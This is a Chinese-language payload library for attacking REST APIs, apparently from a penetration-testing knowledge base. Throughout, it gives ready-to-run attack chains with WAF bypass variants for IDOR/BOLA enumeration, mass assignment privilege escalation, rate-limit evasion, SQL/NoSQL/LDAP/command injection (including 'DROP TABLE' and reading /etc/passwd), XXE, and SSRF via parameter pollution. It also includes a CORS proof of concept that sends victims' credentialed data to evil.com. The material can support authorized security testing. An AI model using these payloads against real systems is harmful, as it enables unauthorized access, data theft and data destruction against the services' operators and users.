# REST API 核心攻击 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:REST API 通用测试 + IDOR / BOLA / Mass Assignment / 速率限制绕过 / API 注入。OWASP API Top 10 的 #1 #3 #4 #5 都在这里。

---

## A. REST API 安全测试(通用)

### REST API安全测试  `rest-api-security`
REST API安全测试与漏洞利用
子类：**REST API** · tags: `rest` `api` `security` `testing`

**前置条件：** 目标使用REST API；了解API端点

**攻击链：**

**1. 1. API端点发现**
_发现API端点_
```
# 常见API端点
/api/v1/users
/api/v2/products
/api/docs
/api/swagger.json
/api/openapi.json
/swagger-ui.html
/redoc

# 使用工具发现
ffuf -u http://target.com/api/FUZZ -w api_endpoints.txt
wfuzz -c -w api_wordlist.txt http://target.com/api/FUZZ
```

**2. 2. 认证测试**
_测试API认证_
```
# 测试未授权访问
curl http://target.com/api/v1/users

# 测试JWT
curl -H "Authorization: Bearer TOKEN" http://target.com/api/v1/users

# 测试API Key
curl -H "X-API-Key: key123" http://target.com/api/v1/users

# 测试Basic Auth
curl -u user:pass http://target.com/api/v1/users
```

**3. 3. HTTP方法测试**
_测试HTTP方法_
```
# 测试允许的HTTP方法
curl -X OPTIONS http://target.com/api/v1/users -v

# 尝试PUT修改
curl -X PUT -H "Content-Type: application/json" \
  -d '{"name":"hacked"}' http://target.com/api/v1/users/1

# 尝试DELETE删除
curl -X DELETE http://target.com/api/v1/users/1

# 尝试PATCH部分更新
curl -X PATCH -H "Content-Type: application/json" \
  -d '{"role":"admin"}' http://target.com/api/v1/users/1
```

**4. 4. 参数污染**
_测试参数污染_
```
# 参数污染测试
# 重复参数
/api/users?id=1&id=2
/api/users?name=admin&name=user

# 数组参数
/api/users?id[]=1&id[]=2
/api/users?name[0]=admin&name[1]=user

# JSON注入
/api/users?filter={"role":"admin"}
/api/users?sort=role&order=desc; DROP TABLE users--
```

**5. 5. 内容类型测试**
_测试内容类型处理_
```
# 测试不同Content-Type
curl -H "Content-Type: application/xml" -d "<user><name>test</name></user>" http://target.com/api/users
curl -H "Content-Type: text/plain" -d "name=test" http://target.com/api/users
curl -H "Content-Type: application/x-www-form-urlencoded" -d "name=test" http://target.com/api/users

# XML外部实体
curl -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>' \
  http://target.com/api/users
```

**WAF/EDR 绕过变体：**

**1. API版本绕过**
_使用不同API版本绕过_
```
# 尝试不同API版本
/api/v1/users  # 可能已修复
/api/v2/users  # 可能未修复
/api/users     # 旧版本可能无保护

# 尝试内部API
/internal/api/users
/private/api/users
/_api/users
```

**2. 编码绕过**
_使用编码绕过_
```
# URL编码
curl http://target.com/api/users/%31  # /users/1

# Unicode编码
curl http://target.com/api/users/%u0031

# 双重URL编码
curl http://target.com/api/users/%2531
```

---


---

## B. IDOR / BOLA / Mass Assignment / Rate Limit / Injection

### IDOR不安全的直接对象引用  `api-idor`
利用IDOR漏洞访问未授权资源
子类：**IDOR** · tags: `idor` `api` `authorization` `bypass`

**前置条件：** 目标使用ID引用资源；存在授权检查缺陷

**攻击链：**

**1. 1. 识别ID参数**
_识别ID参数_
```
# 常见ID参数位置
/api/users/123
/api/orders?id=123
/api/documents/abc-123
/api/profile?user_id=123

# 观察响应
# 记录不同ID返回的数据差异
```

**2. 2. 枚举ID**
_枚举ID值_
```
# 数字ID枚举
for i in $(seq 1 1000); do
  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/users/$i" >> output.txt
done

# 使用Burp Intruder
# Payload: Numbers 1-10000
# GET /api/users/{id}

# UUID枚举
# 使用ffuf
ffuf -u http://target.com/api/users/FUZZ -w uuid_list.txt -H "Authorization: Bearer TOKEN"
```

**3. 3. 批量检测**
_批量检测IDOR_
```
# Python脚本批量检测
import requests

token = "YOUR_TOKEN"
for i in range(1, 100):
    r = requests.get(
        f"http://target.com/api/users/{i}",
        headers={"Authorization": f"Bearer {token}"}
    )
    if r.status_code == 200:
        print(f"ID {i}: {r.json()}")

# 检测数据泄露
# 比较不同用户访问同一ID的响应
```

**4. 4. 跨用户访问**
_跨用户访问测试_
```
# 尝试访问其他用户数据
# 用户A的Token访问用户B的数据

# 修改请求中的ID
GET /api/users/2  # 原本是用户1
GET /api/orders?user_id=2  # 原本是user_id=1

# 修改POST/PUT请求体
{
  "user_id": 2,  # 修改为其他用户ID
  "amount": 1000
}
```

**WAF/EDR 绕过变体：**

**1. ID变体绕过**
_ID变体绕过_
```
# 数字变体
/api/users/001
/api/users/1
/api/users/0x1
/api/users/1.0

# 编码绕过
/api/users/%31  # URL编码
/api/users/MSAg  # Base64编码

# 数组绕过
/api/users?id[]=1&id[]=2
/api/users[0]=1&users[1]=2
```

**2. 参数污染**
_参数污染绕过_
```
# 参数污染
/api/users?id=1&id=2
/api/users?id=2&id=1

# JSON注入
{"id": 1, "id": 2}

# 批量操作
/api/users/batch?ids=1,2,3,4,5
```

---

### API速率限制绕过  `api-rate-limit`
绕过API速率限制进行暴力攻击
子类：**速率限制** · tags: `api` `rate-limit` `bypass` `brute-force`

**前置条件：** 目标有速率限制；限制实现有缺陷

**攻击链：**

**1. 1. 检测速率限制**
_检测速率限制_
```
# 快速发送请求检测限制
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" http://target.com/api/test
done

# 观察响应
# 429 Too Many Requests
# 403 Forbidden
# 自定义错误消息
```

**2. 2. IP绕过**
_使用IP头绕过_
```
# X-Forwarded-For绕过
curl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/test
curl -H "X-Forwarded-For: 1.2.3.5" http://target.com/api/test
curl -H "X-Forwarded-For: 1.2.3.6" http://target.com/api/test

# 其他IP头
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
True-Client-IP: 1.2.3.4

# 自动化
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 1.2.3.$i" http://target.com/api/test
done
```

**3. 3. 分布式绕过**
_分布式绕过速率限制_
```
# 使用多个代理
# 配置代理池
proxies = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    "http://proxy3:8080"
]

# Python脚本
import requests
proxies_list = ["http://proxy1:8080", "http://proxy2:8080"]
for i, proxy in enumerate(proxies_list):
    requests.get("http://target.com/api/test", proxies={"http": proxy})

# 使用Tor
# 每次请求头换Tor电路
import stem.process
import requests

# 使用云函数
# AWS Lambda, Azure Functions等
```

**4. 4. 其他绕过技术**
_其他绕过技术_
```
# 用户代理绕过
curl -A "Googlebot" http://target.com/api/test
curl -A "Bingbot" http://target.com/api/test

# 认证绕过
# 使用不同账户
for token in $TOKENS; do
  curl -H "Authorization: Bearer $token" http://target.com/api/test
done

# HTTP/2多路复用
# 单个连接发送多个请求

# 缓慢请求
# Slowloris攻击
```

**WAF/EDR 绕过变体：**

**1. API Key轮换**
_API Key轮换_
```
# 使用多个API Key
api_keys = ["key1", "key2", "key3", "key4"]
for i, key in enumerate(api_keys):
    requests.get("http://target.com/api/test", headers={"X-API-Key": key})

# 注册多个账户获取多个Token
```

**2. 请求分散**
_请求分散_
```
# 添加延迟
import time
for i in range(100):
    requests.get("http://target.com/api/test")
    time.sleep(0.5)  # 每次请求头隔0.5秒

# 分散到不同时间段
# 使用定时任务分散请求
```

---

### 批量赋值漏洞  `api-mass-assignment`
利用批量赋值漏洞修改敏感字段
子类：**批量赋值** · tags: `api` `mass-assignment` `privilege-escalation`

**前置条件：** API接受JSON输入；存在未过滤的字段

**攻击链：**

**1. 1. 识别输入字段**
_识别返回的字段_
```
# 正常请求
POST /api/users
{
  "name": "test",
  "email": "test@test.com"
}

# 观察响应
{
  "id": 1,
  "name": "test",
  "email": "test@test.com",
  "role": "user",
  "isAdmin": false,
  "createdAt": "2024-01-01"
}
```

**2. 2. 添加敏感字段**
_添加敏感字段_
```
# 尝试添加role字段
POST /api/users
{
  "name": "test",
  "email": "test@test.com",
  "role": "admin"
}

# 尝试isAdmin
{
  "name": "test",
  "email": "test@test.com",
  "isAdmin": true
}

# 尝试多个字段
{
  "name": "test",
  "email": "test@test.com",
  "role": "admin",
  "isAdmin": true,
  "permissions": ["read", "write", "delete"]
}
```

**3. 3. 更新操作**
_更新操作测试_
```
# PUT/PATCH更新
PATCH /api/users/123
{
  "role": "admin"
}

# 尝试修改其他用户
PATCH /api/users/1
{
  "role": "admin"
}

# 尝试修改密码
PATCH /api/users/me
{
  "password": "newpassword123"
}
```

**4. 4. 嵌套对象**
_嵌套对象测试_
```
# 嵌套对象赋值
{
  "name": "test",
  "settings": {
    "notifications": true,
    "isAdmin": true
  }
}

# 数组赋值
{
  "name": "test",
  "roles": ["admin", "superadmin"]
}
```

**WAF/EDR 绕过变体：**

**1. 字段变体**
_尝试字段变体_
```
# 尝试不同字段名
is_admin, is_Admin, IS_ADMIN
admin, Admin, ADMIN
user_type, userType, user_type_id

# 尝试内部字段
__v, _id, created_at, updated_at
password_hash, passwordHash
```

**2. 类型混淆**
_类型混淆测试_
```
# 数字转布尔
{"isAdmin": 1}
{"isAdmin": "true"}

# 数组转字符串
{"roles": "admin"}

# 对象转数组
{"settings": ["admin"]}
```

**3. 扩展敏感字段清单**
_注册/更新records时尝试注入的字段_
```
# 权限/角色字段
role, roles, role_id, role_name, user_role
isAdmin, is_admin, admin, is_superuser
permissions, privileges, access_level
user_type, user_type_id, account_type

# 组织/租户字段
org, org_id, organization, tenant, tenant_id
group, groups, team, teams

# 状态字段
verified, email_verified, phone_verified
status, account_status, is_active, blocked
plan, tier, subscription_level, is_premium

# 所有权字段
owner, owner_id, created_by, user_id
belongs_to, managed_by
```

**4. 隐藏字段发现**
_从不同端点收集字段名用于 Mass Assignment_
```
# 从 GET 响应中收集所有字段名
GET /api/users/me → {"id":1,"name":"test","role":"user","plan":"free",...}

# 从 JS bundle 中提取 API 字段
grep -r "\.role\|\.isAdmin\|\.plan\|\.tier" main.*.js

# 从 Swagger/OpenAPI schema 收集
curl https://target.com/api/docs/swagger.json | jq '.definitions.User.properties | keys'

# 从不同 API 版本对比（v1 vs v2 可能有不同字段暴露）
diff <(curl -s https://target.com/api/v1/users/1) <(curl -s https://target.com/api/v2/users/1)
```

---

### BOLA破坏对象级授权  `api-bola`
利用BOLA漏洞访问未授权对象
子类：**BOLA** · tags: `api` `bola` `authorization` `idor`

**前置条件：** API使用对象ID；授权检查缺陷

**攻击链：**

**1. 1. 识别对象访问**
_识别对象访问模式_
```
# 观察API端点
GET /api/users/{user_id}/documents
GET /api/teams/{team_id}/members
GET /api/orders/{order_id}

# 分析对象关系
# 用户 -> 文档
# 团队 -> 成员
# 订单 -> 用户
```

**2. 2. 测试授权**
_测试授权检查_
```
# 创建两个账户测试
# 用户A: user_a_token
# 用户B: user_b_token

# 用户A创建资源
POST /api/documents
Authorization: Bearer user_a_token
{"title": "Secret Doc"}
# 返回: {"id": "doc_123"}

# 用户B尝试访问
GET /api/documents/doc_123
Authorization: Bearer user_b_token
# 如果返回200，存在BOLA
```

**3. 3. 横向访问**
_横向访问测试_
```
# 枚举其他用户资源
for doc_id in doc_1 doc_2 doc_3; do
  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/documents/$doc_id"
done

# 访问其他用户私有数据
GET /api/users/2/profile
GET /api/users/2/settings
GET /api/users/2/credit-cards
```

**4. 4. 修改/删除操作**
_修改/删除操作测试_
```
# 修改其他用户数据
PUT /api/documents/doc_123
Authorization: Bearer user_b_token
{"title": "Modified by B"}

# 删除其他用户数据
DELETE /api/documents/doc_123
Authorization: Bearer user_b_token

# 添加到其他团队
POST /api/teams/team_1/members
Authorization: Bearer attacker_token
{"user_id": "attacker_id"}
```

**WAF/EDR 绕过变体：**

**1. 路径遍历**
_路径遍历绕过_
```
# 路径遍历访问
GET /api/users/../admin
GET /api/users/..%2Fadmin

# 编码绕过
GET /api/users/%2e%2e/admin
GET /api/users/..%c0%afadmin
```

**2. 参数篡改**
_参数篡改绕过_
```
# 修改请求方法
# GET变POST
POST /api/documents/doc_123

# 添加参数
GET /api/documents/doc_123?user_id=attacker

# 修改Content-Type
Content-Type: application/xml
<document><id>doc_123</id></document>
```

---

### API注入攻击  `api-injection`
API端点中的各类注入攻击
子类：**API注入** · tags: `api` `injection` `sqli` `nosqli`

**前置条件：** API接受用户输入；输入未正确过滤

**攻击链：**

**1. 1. SQL注入**
_API SQL注入_
```
# REST API SQL注入
GET /api/users?id=1 OR 1=1
GET /api/users?name=admin'--
GET /api/users?sort=name; DROP TABLE users--

# POST请求注入
POST /api/users
{"name": "admin' OR '1'='1"}

# JSON注入
POST /api/search
{"query": "test' UNION SELECT username,password FROM users--"}
```

**2. 2. NoSQL注入**
_NoSQL注入_
```
# MongoDB注入
GET /api/users?name[$ne]=
GET /api/users?age[$gt]=0
GET /api/users?role[$ne]=user

# POST请求
POST /api/login
{"username": "admin", "password": {"$ne": ""}}

{"username": "admin", "password": {"$regex": ".*"}}

# 嵌套查询
{"$where": "this.password == this.password"}
{"$where": "return true"}
```

**3. 3. LDAP注入**
_LDAP注入_
```
# LDAP注入
GET /api/users?name=*)(uid=*))(|(uid=*
GET /api/login?user=*&password=*

# 认证绕过
POST /api/auth
{"user": "admin)(|(password=*))", "password": "x"}

# 信息泄露
GET /api/search?name=*)(objectClass=*)
```

**4. 4. 命令注入**
_命令注入_
```
# OS命令注入
GET /api/ping?host=127.0.0.1;id
GET /api/convert?file=test.pdf;cat /etc/passwd

# POST请求
POST /api/exec
{"cmd": "ls -la; cat /etc/passwd"}

# 反引号注入
GET /api/check?host=`id`
GET /api/check?host=$(id)
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
# URL编码
GET /api/users?id=1%20OR%201%3D1

# Unicode编码
GET /api/users?id=1%u0020OR%u00201%3D1

# 双重编码
GET /api/users?id=1%2520OR%25201%253D1
```

**2. Content-Type绕过**
_Content-Type绕过_
```
# 切换Content-Type
Content-Type: application/xml
<user><id>1 OR 1=1</id></user>

Content-Type: application/x-www-form-urlencoded
id=1+OR+1=1

# JSON数组
{"id": ["1", "OR", "1=1"]}
```

---


---

## C. HPP — HTTP Parameter Pollution（参数污染）

> 核心假设：**安全检查读一个参数值，实际操作读另一个参数值**。同一参数出现多次不是 HTTP 协议错误，但每层（WAF/CDN/反向代理/框架/业务代码）取值规则不同。

### 服务端行为矩阵

**必须先测 `a=1&a=2` 和 `a=2&a=1`（顺序敏感），确定当前技术栈取值规则后再设计攻击。**

| 技术栈 | 默认行为 | `a=1&a=2` 结果 |
|--------|---------|----------------|
| PHP / Apache (`$_GET`) | 取最后一个 | `a=2` |
| ASP.NET / IIS | 逗号拼接 | `a=1,2` |
| JSP / Tomcat (servlet) | 取第一个 | `a=1` |
| Python / Django (`QueryDict`) | 取最后一个 | `a=2` |
| Python / Flask (`request.args`) | 取第一个 | `a=1` |
| Node.js / Express (`req.query`) | 转为数组 | `a=['1','2']` |
| Perl / CGI | 取第一个 | `a=1` |
| Ruby / Rack (`Rack::Utils`) | 取最后一个 | `a=2` |
| Go `net/http` (`ParseQuery`) | 取第一个 | `a=1` |

> **关键**：WAF 在 IIS 前可能看到 `1,2`，PHP 后端只收到 `2`；或代理归一化后改变了取值顺序。

### 核心攻击场景

**HPP + WAF 绕过**：WAF 检查第一个值，应用取最后一个值。
```text
id=1&id=1 UNION SELECT table_name FROM information_schema.tables--
```

**HPP + SSRF**：校验器读安全 URL，请求器读内网 URL。
```text
url=https://allowed.cdn.example/&url=http://169.254.169.254/latest/meta-data/
```

**HPP + CSRF**：双 CSRF token 混淆校验。
```text
csrf=LEGIT_TOKEN&csrf=IGNORED_OR_ALT
```

**HPP + 业务逻辑**：金额/数量双值利用。
```text
amount=1&amount=5000
quantity=1&quantity=-1
```

### 高级 Payload 模式

```text
# 数组风格（PHP / 部分框架）
GET /api?id[]=1&id[]=2 HTTP/1.1

# 混合数组+标量
GET /api?item[]=a&item=b HTTP/1.1

# 嵌套键
GET /api?user[name]=a&user[role]=user&user[role]=admin HTTP/1.1

# JSON 重复键（JSON.parse 取最后一个）
POST /api/users HTTP/1.1
Content-Type: application/json
{"role":"user","role":"admin"}

# 编码 & 号（解析器差异）
param=value1%26other=value2
```

### Body 变体

```text
# multipart/form-data 重复字段
------boundary
Content-Disposition: form-data; name="id"
1
------boundary
Content-Disposition: form-data; name="id"
2
------boundary--
```

### HPP 决策树

```
检测到重复参数名
├── 单层应用 → 读框架文档 + 测试 a=1&a=2 vs a=2&a=1
└── WAF/CDN/代理链 → 映射每层取值规则(first/last/join/array)
    └── 选择攻击模板:
        ├── WAF vs 应用取值差异 → SQLi/XSS 绕过
        ├── URL 分裂 → SSRF
        ├── CSRF token 混淆 → 跨站请求
        ├── 数值字段双值 → 支付/金额操纵
        └── JSON 重复键 → 权限提升
```

---

## D. CORS Misconfiguration（跨域配置错误）

> 当浏览器能跨域读取含认证凭据的 API 响应时，CORS 配置错误允许攻击者窃取敏感数据。

### 高危检查表

| 主题 | 检查内容 |
|------|---------|
| 通配符+凭据 | `Access-Control-Allow-Origin: *` 同时支持凭据传输 |
| Origin 反射 | 服务器直接回显任意 `Origin` 头 |
| 弱 Allowlist | 后缀/前缀/子串/正则/大小写匹配错误 |
| `null` Origin | 接受 sandboxed iframe / file:// / 序列化 Origin |
| Preflight 信任 | 过宽的 methods 和 headers |
| 内部 API 暴露 | 管理后台/租户数据可跨域读取 |

### 快速判定流程

1. 发送构造的 `Origin` 头，检查是否反射到 `Access-Control-Allow-Origin`
2. 测试带凭据和不带凭据（`withCredentials: true`）
3. 探测 Allowlist 绕过：攻击者子域名、解析器边界（`attacker.target.com`、`target.com.attacker.com`）
4. 如果可读数据包含敏感字段 → 链式利用到账户/租户影响

### Origin 反射测试

```bash
# 基础探测
curl -H "Origin: https://evil.com" https://target.com/api/user -v
# 检查响应头: Access-Control-Allow-Origin: https://evil.com ← 反射型

# Null Origin 测试
curl -H "Origin: null" https://target.com/api/user -v

# 子域名欺骗
curl -H "Origin: https://attacker.target.com" https://target.com/api/user -v
curl -H "Origin: https://target.com.attacker.com" https://target.com/api/user -v

# 大小写混淆
curl -H "Origin: https://TARGET.COM" https://target.com/api/user -v
```

### 凭据化跨域读取 PoC

```html
<!-- attacker.com 上的 PoC -->
<script>
fetch('https://target.com/api/user', {
    credentials: 'include'  // 携带 Cookie
})
.then(r => r.json())
.then(data => {
    // 敏感数据外传给攻击者
    new Image().src = 'https://evil.com/log?data=' + btoa(JSON.stringify(data));
});
</script>
```

### Allowlist 绕过技术

| 绕过类型 | 示例 |
|---------|------|
| 后缀匹配缺陷 | Origin: `https://evil.target.com`（如果仅匹配 `.target.com` 后缀） |
| 前缀匹配缺陷 | Origin: `https://target.com.evil.com` |
| 未转义点号 | Origin: `https://targetXcom.evil.com`（`.` 被解释为正则通配符） |
| 大小写 | Origin: `https://TARGET.COM` |
| 端口省略 | Origin: `https://target.com:1337`（如果只校验 hostname） |
| 子域名接管 | 接管 `subdomain.target.com` 后利用其可信 Origin |

---

## E. API 安全测试优先级execution-framework

> 来自 API 安全路由体系，确定测试顺序。

### 推荐流程

1. **接口暴露面**：先看 API 文档（Swagger/OpenAPI）、版本漂移、隐藏文档
2. **授权边界**：对象级（BOLA/IDOR）→ 功能级（BFLA/方法滥用）→ 隐藏可写字段
3. **令牌与信任**：JWT 算法/密钥/Claim → API Key 信任 → Header 欺骗 → 限流绕过
4. **复杂输入**：GraphQL introspection → 批量查询 → 隐藏参数 → Schema 滥用
5. **浏览器信任边界**：CORS 跨域读取 → CSRF → SameSite 绕过

### 快速分诊表

| 观察到 | 优先测试方向 |
|--------|-------------|
| Swagger/OpenAPI 暴露 | 隐藏端点、弃用版本、未文档化参数 |
| URL/JSON/Header 中有对象 ID | BOLA/IDOR 水平+垂直越权 |
| JWT token 可见 | 算法混淆、密钥信任、Claim 滥用 |
| `/graphql` 或批量 JSON | introspection、batching、未公开字段 |
| 注册/登录/records更新接受额外字段 | Mass Assignment 提权 |

---

← 回 [00-index.md](00-index.md) · 相关:[`../arbitrary-x-authz.md`](../arbitrary-x-authz.md)(任意 X 越权)
